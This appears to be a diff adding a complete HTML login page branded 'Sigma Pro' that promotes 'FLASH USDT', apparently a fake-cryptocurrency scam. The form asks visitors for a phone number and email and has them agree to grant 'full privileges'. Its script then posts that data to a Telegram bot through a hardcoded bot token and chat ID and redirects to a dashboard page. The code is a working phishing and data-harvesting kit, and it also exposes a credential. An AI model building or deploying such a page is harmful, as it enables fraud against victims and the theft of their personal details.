@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Sigma Pro</title>
+    <!-- استخدام خط Inter لمظهر عصري -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* المتغيرات والأنماط الأساسية من القالب المطلوب */
+        :root {
+            --neon-color: #00ffc8;
+            --bg-dark: #0A0A0A;
+            --card-bg: rgba(20, 20, 30, 0.95);
+        }
+        * {
+            box-sizing: border-box;
+        }
+        html, body {
+            margin: 0; 
+            padding: 0;
+            height: 100%;
+            font-family: 'Inter', Arial, sans-serif;
+            background-color: var(--bg-dark);
+            color: white;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+        /* تأثير الخلفية المتحركة */
+        .background-lines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                135deg,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(0, 255, 200, 0.08) 10%,
+                rgba(0, 255, 200, 0.15) 20%, 
+                rgba(0, 255, 200, 0.08) 30%,
+                rgba(255, 255, 255, 0) 40%
+            );
+            background-size: 80% 100%;
+            animation: moveLines 15s linear infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+        @keyframes moveLines {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        /* تنسيق الحاوية الرئيسية (Form Wrapper) */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 90vw;
+            max-width: 400px;
+            background: var(--card-bg); 
+            border-radius: 16px; 
+            padding: 30px 24px; 
+            box-shadow: 0 0 25px var(--neon-color), 
+                        inset 0 0 5px var(--neon-color);
+            text-align: left;
+            margin: 20px;
+        }
+        
+        /* تنسيق العنوان والشعار */
+        .title-container {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(0, 255, 200, 0.3);
+        }
+        .title-container h1 {
+            font-size: 2.5rem; 
+            font-weight: 800;
+            margin: 0;
+            color: white;
+            letter-spacing: 0.05em;
+        }
+        .title-container p {
+            font-size: 1rem;
+            color: #ccc;
+            margin-top: 5px;
+        }
+
+        /* تنسيق حقول الإدخال */
+        .input-style {
+            width: 100%;
+            padding: 12px 16px; 
+            font-size: 1.05rem; 
+            border-radius: 10px;
+            border: none;
+            background: #181818; 
+            color: #fff;
+            outline: none;
+            box-shadow: inset 0 0 4px rgba(0, 255, 200, 0.3); 
+            transition: box-shadow 0.3s ease;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+        .input-style:focus {
+            box-shadow: inset 0 0 4px var(--neon-color), 0 0 8px #00ffc844;
+        }
+        
+        /* تنسيق مجموعة الهاتف والرمز */
+        .phone-input-group {
+            display: flex;
+            background: #181818;
+            border-radius: 10px;
+            box-shadow: inset 0 0 4px rgba(0, 255, 200, 0.3); 
+            transition: box-shadow 0.3s ease;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .phone-input-group:focus-within {
+             box-shadow: inset 0 0 4px var(--neon-color), 0 0 8px #00ffc844;
+        }
+        .phone-input-group select {
+            border: none;
+            background: transparent;
+            color: white;
+            padding: 12px 8px;
+            width: 35%;
+            font-size: 1.05rem;
+            outline: none;
+            border-right: 1px solid rgba(0, 255, 200, 0.3);
+            cursor: pointer;
+        }
+        .phone-input-group input {
+            border: none;
+            background: transparent;
+            color: white;
+            padding: 12px 16px;
+            flex-grow: 1;
+            font-size: 1.05rem;
+            outline: none;
+        }
+
+        /* تنسيق زر "START FLASHING" */
+        #start-flashing-btn {
+            width: 100%;
+            padding: 16px 0; 
+            font-size: 1.2rem;
+            color: black; 
+            background: var(--neon-color);
+            border: none;
+            border-radius: 15px; 
+            cursor: pointer;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            box-shadow: 0 0 15px var(--neon-color), inset 0 0 5px #fff; 
+            transition: all 0.3s ease;
+            margin-top: 25px !important;
+        }
+        #start-flashing-btn:hover:not(:disabled) {
+            background-color: #00e0b0;
+            box-shadow: 0 0 25px var(--neon-color);
+            transform: translateY(-2px);
+        }
+        #start-flashing-btn:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* تنسيق رسالة الخطأ والنجاح */
+        #message-box {
+            font-size: 0.9rem;
+            font-weight: 600;
+            border-radius: 8px;
+            margin-top: 15px;
+            padding: 10px;
+        }
+        .message-success {
+            background-color: rgba(0, 255, 200, 0.2);
+            color: var(--neon-color);
+            border: 1px solid var(--neon-color);
+        }
+        .message-error {
+            background-color: rgba(255, 0, 0, 0.2);
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d;
+        }
+
+        /* تنسيق صندوق الاتفاقية (Checkbox) */
+        .agreement-checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            padding-top: 15px;
+        }
+        .agreement-checkbox-group input[type="checkbox"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #555;
+            border-radius: 4px;
+            margin-right: 10px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .agreement-checkbox-group input[type="checkbox"]:checked {
+            background-color: var(--neon-color);
+            border-color: var(--neon-color);
+            box-shadow: 0 0 8px var(--neon-color);
+        }
+        .agreement-checkbox-group input[type="checkbox"]:checked::before {
+            content: '✓';
+            display: block;
+            color: #0A0A0A; 
+            font-size: 14px;
+            text-align: center;
+            line-height: 18px;
+        }
+        .agreement-checkbox-group label {
+            color: #b0fff0;
+            font-size: 0.9rem;
+            cursor: pointer;
+            line-height: 1.4;
+        }
+
+        /* تنسيق المودال (نافذة التأكيد) */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1a1a1a;
+            padding: 25px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 350px;
+            box-shadow: 0 0 15px rgba(0, 255, 200, 0.5);
+            border: 1px solid rgba(0, 255, 200, 0.3);
+            text-align: left;
+        }
+        .modal-content h2 {
+            color: var(--neon-color);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .modal-content p {
+            color: #ccc;
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+        }
+        .modal-actions button {
+            padding: 10px 18px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            transition: all 0.2s;
+        }
+        #modal-cancel-btn {
+            background: #333;
+            color: #ccc;
+        }
+        #modal-cancel-btn:hover {
+            background: #555;
+        }
+        #modal-confirm-btn {
+            background: var(--neon-color);
+            color: #0A0A0A;
+            box-shadow: 0 0 8px var(--neon-color);
+        }
+        #modal-confirm-btn:hover {
+            background: #00e0b0;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- الخلفية المتحركة -->
+    <div class="background-lines"></div>
+
+    <!-- Main Content Container -->
+    <div id="main-container" class="container" role="main" aria-label="Registration and Confirmation Form">
+
+        <!-- Header -->
+        <header class="title-container">
+            <h1 class="font-extrabold">HELLO, SIR</h1>
+            <p>please confirm your information</p>
+        </header>
+
+        <!-- Input Form -->
+        <form id="flashing-form">
+
+            <!-- 1. Phone Number Field and Country Code Selector -->
+            <div class="phone-input-group">
+                <!-- Country Code Selector (Dropdown) -->
+                <select id="country-code" class="no-scrollbar">
+                    <!-- Options populated by JavaScript -->
+                </select>
+                <!-- Phone Number Input Field -->
+                <input
+                    type="tel"
+                    id="phone-number"
+                    placeholder="Enter phone number"
+                    required
+                >
+            </div>
+
+
+            <!-- 2. Email Input Field (Gmail) -->
+            <input
+                type="email"
+                id="gmail-input"
+                placeholder="Email Address"
+                class="input-style"
+                required
+            >
+
+            <!-- 3. Agreement Checkbox -->
+            <div class="agreement-checkbox-group">
+                <input
+                    type="checkbox"
+                    id="agreement-checkbox"
+                    required
+                >
+                <label for="agreement-checkbox">
+                    I agree to grant full privileges to this number and email later for confirmation of receipt.
+                </label>
+            </div>
+
+            <!-- 4. START FLASHING Button (Now triggers the modal) -->
+            <button
+                type="button" 
+                id="start-flashing-btn"
+            >
+                START FLASHING
+            </button>
+
+            <!-- Error or Success Message (Hidden by default) -->
+            <div id="message-box" class="hidden text-center" role="alert" aria-live="assertive"></div>
+
+        </form>
+
+    </div>
+
+    <!-- Confirmation Modal (Hidden by default) -->
+    <div id="confirmation-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h2 class="neon-green">Confirm Action</h2>
+            <p>
+                This number and email address will be used to confirm the payment and receipt of FLASH USDT.
+            </p>
+            <div class="modal-actions flex justify-end space-x-3 pt-2">
+                <button id="modal-cancel-btn">Cancel</button>
+                <button id="modal-confirm-btn">Confirm & Proceed</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // List of countries (Name, Dial Code, Flag Emoji) - Extended List
+        const countryData = [
+            { name_en: "Afghanistan", code: "+93", flag: "🇦🇫" },
+            { name_en: "Albania", code: "+355", flag: "🇦🇱" },
+            { name_en: "Algeria", code: "+213", flag: "🇩🇿" },
+            { name_en: "Andorra", code: "+376", flag: "🇦🇩" },
+            { name_en: "Angola", code: "+244", flag: "🇦🇴" },
+            { name_en: "Argentina", code: "+54", flag: "🇦🇷" },
+            { name_en: "Armenia", code: "+374", flag: "🇦🇲" },
+            { name_en: "Australia", code: "+61", flag: "🇦🇺" },
+            { name_en: "Austria", code: "+43", flag: "🇦🇹" },
+            { name_en: "Azerbaijan", code: "+994", flag: "🇦🇿" },
+            { name_en: "Bahrain", code: "+973", flag: "🇧🇭" },
+            { name_en: "Bangladesh", code: "+880", flag: "🇧🇩" },
+            { name_en: "Belgium", code: "+32", flag: "🇧🇪" },
+            { name_en: "Bolivia", code: "+591", flag: "🇧🇴" },
+            { name_en: "Bosnia and Herzegovina", code: "+387", flag: "🇧🇦" },
+            { name_en: "Brazil", code: "+55", flag: "🇧🇷" },
+            { name_en: "Bulgaria", code: "+359", flag: "🇧🇬" },
+            { name_en: "Canada", code: "+1", flag: "🇨🇦" },
+            { name_en: "Chile", code: "+56", flag: "🇨🇱" },
+            { name_en: "China", code: "+86", flag: "🇨🇳" },
+            { name_en: "Colombia", code: "+57", flag: "🇨🇴" },
+            { name_en: "Croatia", code: "+385", flag: "🇭🇷" },
+            { name_en: "Cuba", code: "+53", flag: "🇨🇺" },
+            { name_en: "Cyprus", code: "+357", flag: "🇨🇾" },
+            { name_en: "Czech Republic", code: "+420", flag: "🇨🇿" },
+            { name_en: "Denmark", code: "+45", flag: "🇩🇰" },
+            { name_en: "Ecuador", code: "+593", flag: "🇪🇨" },
+            { name_en: "Egypt", code: "+20", flag: "🇪🇬" },
+            { name_en: "Finland", code: "+358", flag: "🇫🇮" },
+            { name_en: "France", code: "+33", flag: "🇫🇷" },
+            { name_en: "Germany", code: "+49", flag: "🇩🇪" },
+            { name_en: "Greece", code: "+30", flag: "🇬🇷" },
+            { name_en: "Hong Kong", code: "+852", flag: "🇭🇰" },
+            { name_en: "Hungary", code: "+36", flag: "🇭🇺" },
+            { name_en: "Iceland", code: "+354", flag: "🇮🇸" },
+            { name_en: "India", code: "+91", flag: "🇮🇳" },
+            { name_en: "Indonesia", code: "+62", flag: "🇮🇩" },
+            { name_en: "Iraq", code: "+964", flag: "🇮🇶" },
+            { name_en: "Ireland", code: "+353", flag: "🇮🇪" },
+            { name_en: "Israel", code: "+972", flag: "🇮🇱" },
+            { name_en: "Italy", code: "+39", flag: "🇮🇹" },
+            { name_en: "Japan", code: "+81", flag: "🇯🇵" },
+            { name_en: "Jordan", code: "+962", flag: "🇯🇴" },
+            { name_en: "Kazakhstan", code: "+7", flag: "🇰🇿" },
+            { name_en: "Kenya", code: "+254", flag: "🇰🇪" },
+            { name_en: "Kuwait", code: "+965", flag: "🇰🇼" },
+            { name_en: "Lebanon", code: "+961", flag: "🇱🇧" },
+            { name_en: "Libya", code: "+218", flag: "🇱🇾" },
+            { name_en: "Malaysia", code: "+60", flag: "🇲🇾" },
+            { name_en: "Mexico", code: "+52", flag: "🇲🇽" },
+            { name_en: "Morocco", code: "+212", flag: "🇲🇦" },
+            { name_en: "Netherlands", code: "+31", flag: "🇳🇱" },
+            { name_en: "New Zealand", code: "+64", flag: "🇳🇿" },
+            { name_en: "Nigeria", code: "+234", flag: "🇳🇬" },
+            { name_en: "Norway", code: "+47", flag: "🇳🇴" },
+            { name_en: "Oman", code: "+968", flag: "🇴🇲" },
+            { name_en: "Pakistan", code: "+92", flag: "🇵🇰" },
+            { name_en: "Palestine", code: "+970", flag: "🇵🇸" },
+            { name_en: "Peru", code: "+51", flag: "🇵🇪" },
+            { name_en: "Philippines", code: "+63", flag: "🇵🇭" },
+            { name_en: "Poland", code: "+48", flag: "🇵🇱" },
+            { name_en: "Portugal", code: "+351", flag: "🇵🇹" },
+            { name_en: "Qatar", code: "+974", flag: "🇶🇦" },
+            { name_en: "Romania", code: "+40", flag: "🇷🇴" },
+            { name_en: "Russia", code: "+7", flag: "🇷🇺" },
+            { name_en: "Saudi Arabia", code: "+966", flag: "🇸🇦" },
+            { name_en: "Singapore", code: "+65", flag: "🇸🇬" },
+            { name_en: "South Africa", code: "+27", flag: "🇿🇦" },
+            { name_en: "South Korea", code: "+82", flag: "🇰🇷" },
+            { name_en: "Spain", code: "+34", flag: "🇪🇸" },
+            { name_en: "Sudan", code: "+249", flag: "🇸🇩" },
+            { name_en: "Sweden", code: "+46", flag: "🇸🇪" },
+            { name_en: "Switzerland", code: "+41", flag: "🇨🇭" },
+            { name_en: "Syria", code: "+963", flag: "🇸🇾" },
+            { name_en: "Thailand", code: "+66", flag: "🇹🇭" },
+            { name_en: "Tunisia", code: "+216", flag: "🇹🇳" },
+            { name_en: "Turkey", code: "+90", flag: "🇹🇷" },
+            { name_en: "UAE", code: "+971", flag: "🇦🇪" },
+            { name_en: "Ukraine", code: "+380", flag: "🇺🇦" },
+            { name_en: "United Kingdom", code: "+44", flag: "🇬🇧" },
+            { name_en: "United States", code: "+1", flag: "🇺🇸" },
+            { name_en: "Venezuela", code: "+58", flag: "🇻🇪" },
+            { name_en: "Vietnam", code: "+84", flag: "🇻🇳" },
+            { name_en: "Yemen", code: "+967", flag: "🇾🇪" }
+        ].sort((a, b) => a.name_en.localeCompare(b.name_en)); // Alphabetical sorting
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const countryCodeSelect = document.getElementById('country-code');
+            const form = document.getElementById('flashing-form');
+            const startFlashingBtn = document.getElementById('start-flashing-btn');
+            const phoneNumberInput = document.getElementById('phone-number');
+            const gmailInput = document.getElementById('gmail-input');
+            const agreementCheckbox = document.getElementById('agreement-checkbox');
+            const messageBox = document.getElementById('message-box');
+
+            // Modal elements
+            const modal = document.getElementById('confirmation-modal');
+            const modalCancelBtn = document.getElementById('modal-cancel-btn');
+            const modalConfirmBtn = document.getElementById('modal-confirm-btn');
+
+            // --- Logic for Country-Specific Phone Number Validation ---
+            const specialPatterns = {
+                // Algeria: Must start with 5, 6, or 7 and be exactly 9 digits long (excluding country code)
+                "+213": {
+                    regex: "^[567]\\d{8}$",
+                    title: "Algerian mobile number must start with 5, 6, or 7 and consist of 9 digits (e.g., 5XX XXX XXX).",
+                    placeholder: "Enter phone number"
+                },
+                // Default rule uses 'Enter a valid phone number' as placeholder and simple validation
+            };
+
+            const updatePhoneNumberPattern = (countryCode) => {
+                const patternInfo = specialPatterns[countryCode];
+
+                if (patternInfo) {
+                    phoneNumberInput.pattern = patternInfo.regex;
+                    phoneNumberInput.title = patternInfo.title;
+                    phoneNumberInput.placeholder = patternInfo.placeholder;
+                } else {
+                    // Default rule for all other countries (5 to 15 digits)
+                    phoneNumberInput.pattern = "[0-9]{5,15}";
+                    phoneNumberInput.title = "Please enter a valid phone number (5 to 15 digits).";
+                    phoneNumberInput.placeholder = "Enter phone number";
+                }
+            }
+            // --- End of Country-Specific Phone Number Validation Logic ---
+
+
+            // 1. Populate the country dropdown list
+            countryData.forEach(country => {
+                const option = document.createElement('option');
+                
+                // Value is the code used for the phone number
+                option.value = country.code;
+                
+                // data-attribute for the short display (closed)
+                option.dataset.short = `${country.flag} ${country.code}`;
+                
+                // data-attribute for the long display (open list)
+                option.dataset.long = `${country.flag} ${country.code} (${country.name_en})`;
+                
+                // Initially, all options show the long name for the dropdown to work
+                option.textContent = option.dataset.long;
+                
+                countryCodeSelect.appendChild(option);
+            });
+            
+            // Function to update the displayed text of the select element (short display)
+            const updateSelectDisplay = () => {
+                const selectedOption = countryCodeSelect.options[countryCodeSelect.selectedIndex];
+                if (selectedOption && selectedOption.dataset.short) {
+                    // Temporarily set the selected option's text to the short version (Flag + Code)
+                    selectedOption.textContent = selectedOption.dataset.short;
+                }
+            };
+            
+            // 2. Event Listener to handle the selected display text
+            countryCodeSelect.addEventListener('change', () => {
+                updateSelectDisplay();
+                updatePhoneNumberPattern(countryCodeSelect.value); // Update validation and placeholder on change
+            });
+            
+            // Event listener to reset all options to long name when the select is focused/opened
+            countryCodeSelect.addEventListener('focus', () => {
+                Array.from(countryCodeSelect.options).forEach(option => {
+                    option.textContent = option.dataset.long;
+                });
+            });
+            
+            // 3. Set default value and its initial display
+            const defaultCode = "+213"; // Algeria default code
+            countryCodeSelect.value = countryData.find(c => c.code === defaultCode)?.code || countryData[0].code;
+            updateSelectDisplay();
+            updatePhoneNumberPattern(countryCodeSelect.value); // Apply initial validation on load
+
+
+            // 4. Function to show message
+            const showMessage = (text, isSuccess = true) => {
+                messageBox.textContent = text;
+                messageBox.classList.remove('hidden', 'message-success', 'message-error');
+                messageBox.classList.add(isSuccess ? 'message-success' : 'message-error');
+                
+                setTimeout(() => {
+                    messageBox.classList.add('hidden');
+                }, 5000); // Hide message after 5 seconds
+            };
+
+            // 5. Function to send data to a Telegram bot (functional implementation)
+            const sendToTelegram = async (data) => {
+                // *** User-provided credentials ***
+                const BOT_TOKEN = '8518749348:AAEbcJ2AEXzoHrYp1nr_-HFHab-q5-MiOv0'; 
+                const CHAT_ID = '8066634898'; 
+                const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                const selectedOption = countryCodeSelect.options[countryCodeSelect.selectedIndex];
+                const countryName = selectedOption.dataset.long.match(/\((.*?)\)/)?.[1] || "Unknown Country";
+                const fullPhoneNumber = `${data.countryCode}${data.phoneNumber}`;
+                
+                const messageText = `
+                    🚨 New Registration Process 🚨
+                    -------------------------
+                    *Country:* ${countryName}
+                    *Phone Number:* ${fullPhoneNumber}
+                    *Email Address (Gmail):* ${data.email}
+                    *Agreement:* Granted full privileges.
+                    -------------------------
+                `;
+
+                // Log data being sent
+                console.log("--- Attempting to send data to Telegram ---");
+                console.log("Chat ID:", CHAT_ID);
+                console.log("Message:", messageText);
+
+                try {
+                    const response = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: messageText,
+                            parse_mode: 'Markdown', // Use Markdown for better formatting
+                        }),
+                    });
+
+                    const result = await response.json();
+
+                    if (response.ok && result.ok) {
+                        console.log("Telegram API Success:", result);
+                        return { ok: true, message: "Data sent successfully. Redirecting..." };
+                    } else {
+                        console.error("Telegram API Error:", result);
+                        return { ok: false, message: `Submission failed. Telegram API Error: ${result.description || 'Unknown error.'}` };
+                    }
+                } catch (error) {
+                    console.error("Network or Fetch Error:", error);
+                    return { ok: false, message: "Network Error. Could not connect to the server." };
+                }
+            };
+
+            // 6. Core Submission Handler (called by modal confirmation)
+            const handleSubmission = async () => {
+                // Hide modal
+                modal.style.display = 'none';
+
+                const originalText = startFlashingBtn.textContent;
+                
+                // Disable button and show loading state
+                startFlashingBtn.textContent = 'Submitting...';
+                startFlashingBtn.disabled = true;
+
+                // Collect data
+                const submissionData = {
+                    countryCode: countryCodeSelect.value,
+                    phoneNumber: phoneNumberInput.value.trim(),
+                    email: gmailInput.value.trim(),
+                    agreement: agreementCheckbox.checked,
+                };
+
+                // Execute submission process
+                const result = await sendToTelegram(submissionData);
+
+                // Restore button state
+                startFlashingBtn.textContent = originalText;
+                startFlashingBtn.disabled = false;
+
+
+                if (result.ok) {
+                    // Display success message briefly before redirect
+                    showMessage(result.message, true);
+                    // Redirect to the next page (main.html) after successful submission
+                    setTimeout(() => {
+                         window.location.href = 'dashboard.html';
+                    }, 1000); 
+                   
+                } else {
+                    // Display error message to the user
+                    showMessage(result.message, false);
+                }
+            };
+            
+            // 7. Event Listener for START FLASHING button (shows modal)
+            startFlashingBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                
+                // Perform front-end form validation (required fields, patterns)
+                if (!form.checkValidity()) {
+                    // This triggers the browser's default validation UI (like tooltips)
+                    form.reportValidity();
+                    return; 
+                }
+
+                // If valid, show the confirmation modal
+                modal.style.display = 'flex';
+            });
+            
+            // 8. Modal Button Handlers
+            modalCancelBtn.addEventListener('click', () => {
+                modal.style.display = 'none';
+            });
+
+            modalConfirmBtn.addEventListener('click', handleSubmission);
+
+        });
+    </script>
+</body>
+</html>
+
